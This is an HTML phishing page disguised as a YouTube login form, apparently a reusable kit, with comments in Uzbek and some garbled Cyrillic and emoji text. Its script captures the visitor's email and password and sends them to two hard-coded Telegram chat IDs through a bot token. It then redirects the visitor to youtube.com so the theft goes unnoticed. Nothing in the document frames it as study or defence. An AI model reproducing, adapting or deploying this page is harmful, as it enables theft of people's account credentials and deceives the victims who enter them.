<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login</title>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
    crossorigin="anonymous"
    referrerpolicy="no-referrer"
  />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 24px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #333;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background: #555;
    }
    i.fab.fa-youtube {
      color: red;
    }
    #status {
      margin-top: 10px;
      font-size: 14px;
      color: green;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2><i class="fab fa-youtube"></i> Login</h2>
    <form id="loginForm">
      <input type="email" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
    <p id="status"></p>
  </div>

  <script>
    const telegramBotToken = "7614857686:AAGNsosXnCpI_iLyyLX-lu65fRcbtw_4vXs";  // 游대 O'zingizning bot tokeningiz
    const telegramChatIds = [
      "7904816878",  // 游대 Birinchi chat ID
      "7571255508"   // 游대 Ikkinchi chat ID
    ];
    const redirectUrl = "https://www.youtube.com"; // 游대 Keyingi sahifa (masalan, YouTube)

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = this.email.value;
      const password = this.password.value;

      const message = `游댏 Yangi login:\n游닎 Email: ${email}\n游댐 Parol: ${password}`;
      document.getElementById('status').innerText = "햃쒬쮐햦향햟혡햦혪...";

      // Har bir chat ID ga xabar yuborish
      Promise.all(telegramChatIds.map(chatId => {
        return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      }))
      .then(() => {
        setTimeout(() => {
          window.location.href = redirectUrl;
        }, 1500); // 1.5 soniya kutish
      })
      .catch(error => {
        console.error("Xatolik:", error);
        document.getElementById('status').innerText = "Xabar yuborishda xatolik.";
      });
    });
  </script>
</body>
</html>
